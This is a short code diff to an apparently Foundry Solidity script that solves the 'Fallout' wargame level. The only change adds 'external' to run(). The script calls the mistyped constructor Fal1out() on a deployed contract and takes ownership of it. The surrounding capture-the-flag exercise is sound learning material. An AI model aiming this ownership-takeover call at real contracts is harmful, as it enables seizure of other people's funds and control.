@@ -9,7 +9,7 @@ contract FalloutSolution is Script {
 
   Fallout public fallOut = Fallout(0x902b5Eba04A37ECC299c94Fc346054aB448f499b);
 
-  function run() {
+  function run() external {
     vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
     fallOut.Fal1out();
     console.log(fallOut.owner());
